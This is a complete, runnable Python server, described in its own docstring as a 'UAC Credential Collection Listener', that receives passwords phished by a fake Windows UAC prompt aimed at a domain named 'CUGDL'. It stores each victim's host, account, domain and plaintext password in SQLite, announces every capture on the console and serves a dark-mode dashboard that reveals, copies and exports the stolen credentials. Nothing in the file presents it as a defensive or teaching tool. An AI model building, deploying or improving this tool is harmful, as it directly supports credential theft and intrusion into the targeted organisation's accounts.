#!/usr/bin/env python3
"""
UAC Credential Collection Listener Server
Designed for deployment on Linux VMs (Debian, Ubuntu, Kali, Arch, etc.)

Features:
- Dual Engine: Runs on Flask if installed, or falls back seamlessly to Python's built-in http.server (zero dependencies).
- Live Console Logging: Formatted ANSI banners when credentials arrive.
- SQLite Storage: Automatically persists all captures to credentials.db.
- Web Dashboard: Dark-mode interface to review, search, reveal passwords, and export data (CSV/JSON).
- Health Check: /health endpoint for reachability tests.

Usage:
  python3 server.py
  python3 server.py --host 0.0.0.0 --port 8080 --db credentials.db
"""

import argparse
import csv
import io
import json
import os
import sqlite3
import sys
from datetime import datetime

# ANSI Color Codes for terminal formatting
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

BANNER = f"""{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║              UAC CREDENTIAL LISTENER SERVER                  ║
║                  Linux Collection Node                       ║
╚══════════════════════════════════════════════════════════════╝{RESET}"""

DB_FILE = "credentials.db"


def init_db(db_path: str):
    """Initializes SQLite database with proper schema."""
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            captured_at TEXT NOT NULL,
            remote_ip TEXT,
            hostname TEXT,
            system_user TEXT,
            domain TEXT,
            username TEXT,
            password TEXT
        )
        """
    )
    conn.commit()
    conn.close()


def save_credential(db_path: str, data: dict, remote_ip: str) -> int:
    """Inserts a captured credential into SQLite."""
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cur.execute(
        """
        INSERT INTO credentials (captured_at, remote_ip, hostname, system_user, domain, username, password)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
        (
            now_str,
            remote_ip,
            data.get("hostname", "UNKNOWN"),
            data.get("system_user", "UNKNOWN"),
            data.get("domain", "CUGDL"),
            data.get("username", ""),
            data.get("password", ""),
        ),
    )
    record_id = cur.lastrowid
    conn.commit()
    conn.close()
    return record_id


def get_all_credentials(db_path: str):
    """Fetches all captured credentials."""
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute(
        "SELECT id, captured_at, remote_ip, hostname, system_user, domain, username, password FROM credentials ORDER BY id DESC"
    )
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return rows


def clear_credentials(db_path: str):
    """Clears all records."""
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    cur.execute("DELETE FROM credentials")
    conn.commit()
    conn.close()


def print_credential_banner(record_id: int, data: dict, remote_ip: str):
    """Prints a high-visibility terminal alert when credentials arrive."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    username = data.get("username", "")
    password = data.get("password", "")
    domain = data.get("domain", "CUGDL")
    hostname = data.get("hostname", "UNKNOWN")
    sys_user = data.get("system_user", "UNKNOWN")

    print("\n" + "=" * 62)
    print(f"{GREEN}{BOLD}[+] CREDENTIAL CAPTURED [Record #{record_id}]{RESET} - {now}")
    print("=" * 62)
    print(f"  {CYAN}Source IP:{RESET}    {remote_ip}")
    print(f"  {CYAN}Target Host:{RESET}  {hostname}")
    print(f"  {CYAN}Logged User:{RESET}  {sys_user}")
    print(f"  {CYAN}Target Domain:{RESET}{domain}")
    print(f"  {YELLOW}{BOLD}Username:{RESET}     {BOLD}{username}{RESET}")
    print(f"  {RED}{BOLD}Password:{RESET}     {BOLD}{password}{RESET}")
    print("=" * 62 + "\n")


# HTML Dashboard Template
DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAC Credential Dashboard</title>
    <style>
        :root {
            --bg-main: #0d1117;
            --bg-card: #161b22;
            --border: #30363d;
            --text-primary: #e6edf3;
            --text-muted: #8b949e;
            --accent-blue: #58a6ff;
            --accent-green: #3fb950;
            --accent-red: #f85149;
            --accent-yellow: #d29922;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg-main);
            color: var(--text-primary);
            padding: 24px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border);
        }
        .title-group h1 {
            font-size: 24px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            background: var(--accent-green);
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 8px var(--accent-green);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }
        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px;
        }
        .stat-label { font-size: 13px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
        .stat-value { font-size: 28px; font-weight: 700; color: var(--text-primary); margin-top: 6px; }
        .actions {
            display: flex;
            gap: 10px;
            margin-bottom: 16px;
        }
        .btn {
            background: var(--bg-card);
            border: 1px solid var(--border);
            color: var(--text-primary);
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .btn:hover { background: #21262d; border-color: #8b949e; }
        .btn-danger { color: var(--accent-red); border-color: rgba(248, 81, 73, 0.4); }
        .btn-danger:hover { background: rgba(248, 81, 73, 0.15); border-color: var(--accent-red); }
        .table-container {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 13px;
        }
        th {
            background: #1c2128;
            padding: 12px 16px;
            color: var(--text-muted);
            font-weight: 600;
            border-bottom: 1px solid var(--border);
        }
        td {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            font-family: 'Consolas', 'Courier New', monospace;
        }
        tr:hover { background: rgba(255,255,255,0.02); }
        .pwd-cell {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
            background: rgba(88, 166, 255, 0.15);
            color: var(--accent-blue);
        }
        .icon-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            cursor: pointer;
            padding: 4px;
            border-radius: 4px;
        }
        .icon-btn:hover { color: var(--text-primary); background: #30363d; }
        .empty-state {
            padding: 48px;
            text-align: center;
            color: var(--text-muted);
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="title-group">
            <span class="status-dot"></span>
            <h1>UAC Credential Collection Node</h1>
        </div>
        <div style="font-size: 13px; color: var(--text-muted);">
            Auto-refresh active (3s) • Target Domain: <span style="color: var(--accent-blue); font-weight:600;">CUGDL</span>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-label">Total Captures</div>
            <div class="stat-value" id="stat-total">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Unique Targets</div>
            <div class="stat-value" id="stat-hosts">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Unique Accounts</div>
            <div class="stat-value" id="stat-users">0</div>
        </div>
    </div>

    <div class="actions">
        <a href="/api/export/csv" class="btn">📥 Export CSV</a>
        <a href="/api/export/json" class="btn">📄 Export JSON</a>
        <button onclick="clearDb()" class="btn btn-danger">🗑️ Clear Database</button>
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Timestamp</th>
                    <th>Source IP</th>
                    <th>Target Host</th>
                    <th>Logged User</th>
                    <th>Domain</th>
                    <th>Username</th>
                    <th>Password</th>
                </tr>
            </thead>
            <tbody id="creds-tbody">
                <tr><td colspan="8" class="empty-state">Waiting for incoming captures...</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        let revealState = {};

        async function fetchRecords() {
            try {
                const res = await fetch('/api/credentials');
                const data = await res.json();
                renderTable(data);
            } catch (err) {
                console.error("Poll error", err);
            }
        }

        function renderTable(records) {
            document.getElementById('stat-total').innerText = records.length;
            const hosts = new Set(records.map(r => r.hostname)).size;
            const users = new Set(records.map(r => r.username)).size;
            document.getElementById('stat-hosts').innerText = hosts;
            document.getElementById('stat-users').innerText = users;

            const tbody = document.getElementById('creds-tbody');
            if (records.length === 0) {
                tbody.innerHTML = '<tr><td colspan="8" class="empty-state">No credentials captured yet. Listening on port...</td></tr>';
                return;
            }

            tbody.innerHTML = records.map(r => {
                const isRevealed = revealState[r.id];
                const displayPwd = isRevealed ? r.password : '••••••••••••';
                return `
                    <tr>
                        <td><span class="badge">#${r.id}</span></td>
                        <td>${r.captured_at}</td>
                        <td>${r.remote_ip || 'N/A'}</td>
                        <td>${r.hostname || 'N/A'}</td>
                        <td>${r.system_user || 'N/A'}</td>
                        <td><strong>${r.domain || 'CUGDL'}</strong></td>
                        <td style="color: var(--accent-yellow); font-weight:600;">${escapeHtml(r.username)}</td>
                        <td>
                            <div class="pwd-cell">
                                <span id="pwd-${r.id}" style="color: var(--accent-green); font-weight: 700;">${escapeHtml(displayPwd)}</span>
                                <button class="icon-btn" onclick="togglePassword(${r.id}, '${escapeAttr(r.password)}')">👁️</button>
                                <button class="icon-btn" onclick="copyText('${escapeAttr(r.password)}')">📋</button>
                            </div>
                        </td>
                    </tr>
                `;
            }).join('');
        }

        function togglePassword(id, plain) {
            revealState[id] = !revealState[id];
            const el = document.getElementById('pwd-' + id);
            if (el) {
                el.innerText = revealState[id] ? plain : '••••••••••••';
            }
        }

        function copyText(val) {
            navigator.clipboard.writeText(val);
            alert("Password copied to clipboard!");
        }

        async function clearDb() {
            if (!confirm("Are you sure you want to clear all captured credentials?")) return;
            await fetch('/api/credentials/clear', { method: 'POST' });
            fetchRecords();
        }

        function escapeHtml(text) {
            return (text || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
        function escapeAttr(text) {
            return (text || '').replace(/'/g, "\\'");
        }

        fetchRecords();
        setInterval(fetchRecords, 3000);
    </script>
</body>
</html>
"""


def run_flask_server(host: str, port: int, db_path: str):
    """Runs the Flask application."""
    from flask import Flask, jsonify, request, Response, send_file

    app = Flask(__name__)

    @app.route("/", methods=["GET"])
    def dashboard():
        return DASHBOARD_HTML

    @app.route("/health", methods=["GET"])
    def health():
        return jsonify({"status": "healthy", "service": "uac-listener"}), 200

    @app.route("/api/credentials", methods=["POST"])
    def handle_post():
        data = request.get_json(silent=True)
        if not data:
            try:
                data = json.loads(request.data.decode("utf-8", errors="ignore"))
            except Exception:
                data = {}

        remote_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        record_id = save_credential(db_path, data, remote_ip)
        print_credential_banner(record_id, data, remote_ip)
        return jsonify({"status": "ok", "record_id": record_id}), 200

    @app.route("/api/credentials", methods=["GET"])
    def list_credentials():
        records = get_all_credentials(db_path)
        return jsonify(records), 200

    @app.route("/api/credentials/clear", methods=["POST"])
    def handle_clear():
        clear_credentials(db_path)
        return jsonify({"status": "cleared"}), 200

    @app.route("/api/export/csv", methods=["GET"])
    def export_csv():
        records = get_all_credentials(db_path)
        output = io.StringIO()
        writer = csv.DictWriter(
            output,
            fieldnames=[
                "id",
                "captured_at",
                "remote_ip",
                "hostname",
                "system_user",
                "domain",
                "username",
                "password",
            ],
        )
        writer.writeheader()
        writer.writerows(records)
        return Response(
            output.getvalue(),
            mimetype="text/csv",
            headers={"Content-Disposition": "attachment;filename=credentials.csv"},
        )

    @app.route("/api/export/json", methods=["GET"])
    def export_json():
        records = get_all_credentials(db_path)
        return Response(
            json.dumps(records, indent=2),
            mimetype="application/json",
            headers={"Content-Disposition": "attachment;filename=credentials.json"},
        )

    print(BANNER)
    print(f"[*] Mode:           {GREEN}Flask Engine{RESET}")
    print(f"[*] Listening on:   {CYAN}http://{host}:{port}{RESET}")
    print(f"[*] Credential API: {YELLOW}POST http://{host}:{port}/api/credentials{RESET}")
    print(f"[*] Dashboard:      {CYAN}GET  http://{host}:{port}/{RESET}")
    print(f"[*] Database:       {MAGENTA}{db_path}{RESET}")
    print("[*] Waiting for incoming UAC prompts...\n")

    app.run(host=host, port=port, debug=False)


def run_builtin_server(host: str, port: int, db_path: str):
    """Fallback zero-dependency HTTP server using standard library http.server."""
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            # Suppress default request logging to keep console clean
            pass

        def do_GET(self):
            if self.path == "/" or self.path == "/index.html":
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(DASHBOARD_HTML.encode("utf-8"))
            elif self.path == "/health":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status":"healthy"}')
            elif self.path == "/api/credentials":
                records = get_all_credentials(db_path)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(records).encode("utf-8"))
            elif self.path == "/api/export/csv":
                records = get_all_credentials(db_path)
                output = io.StringIO()
                writer = csv.DictWriter(
                    output,
                    fieldnames=[
                        "id",
                        "captured_at",
                        "remote_ip",
                        "hostname",
                        "system_user",
                        "domain",
                        "username",
                        "password",
                    ],
                )
                writer.writeheader()
                writer.writerows(records)
                self.send_response(200)
                self.send_header("Content-Type", "text/csv")
                self.send_header(
                    "Content-Disposition", "attachment;filename=credentials.csv"
                )
                self.end_headers()
                self.wfile.write(output.getvalue().encode("utf-8"))
            elif self.path == "/api/export/json":
                records = get_all_credentials(db_path)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header(
                    "Content-Disposition", "attachment;filename=credentials.json"
                )
                self.end_headers()
                self.wfile.write(json.dumps(records, indent=2).encode("utf-8"))
            else:
                self.send_response(404)
                self.end_headers()

        def do_POST(self):
            if self.path == "/api/credentials":
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="ignore")
                try:
                    data = json.loads(body)
                except Exception:
                    data = {}

                remote_ip = self.client_address[0]
                record_id = save_credential(db_path, data, remote_ip)
                print_credential_banner(record_id, data, remote_ip)

                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(
                    json.dumps({"status": "ok", "record_id": record_id}).encode(
                        "utf-8"
                    )
                )
            elif self.path == "/api/credentials/clear":
                clear_credentials(db_path)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status":"cleared"}')
            else:
                self.send_response(404)
                self.end_headers()

    print(BANNER)
    print(f"[*] Mode:           {YELLOW}Built-in http.server (Zero dependencies){RESET}")
    print(f"[*] Listening on:   {CYAN}http://{host}:{port}{RESET}")
    print(f"[*] Credential API: {YELLOW}POST http://{host}:{port}/api/credentials{RESET}")
    print(f"[*] Dashboard:      {CYAN}GET  http://{host}:{port}/{RESET}")
    print(f"[*] Database:       {MAGENTA}{db_path}{RESET}")
    print("[*] Waiting for incoming UAC prompts...\n")

    server = HTTPServer((host, port), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down listener...")
        server.server_close()


def main():
    parser = argparse.ArgumentParser(
        description="UAC Clone Credential Listener Server"
    )
    parser.add_argument(
        "--host", default="0.0.0.0", help="Host/IP to bind (default: 0.0.0.0)"
    )
    parser.add_argument(
        "--port", type=int, default=8080, help="Port to bind (default: 8080)"
    )
    parser.add_argument(
        "--db", default=DB_FILE, help=f"SQLite database file (default: {DB_FILE})"
    )
    args = parser.parse_args()

    init_db(args.db)

    try:
        import flask  # noqa: F401

        run_flask_server(args.host, args.port, args.db)
    except ImportError:
        run_builtin_server(args.host, args.port, args.db)


if __name__ == "__main__":
    main()
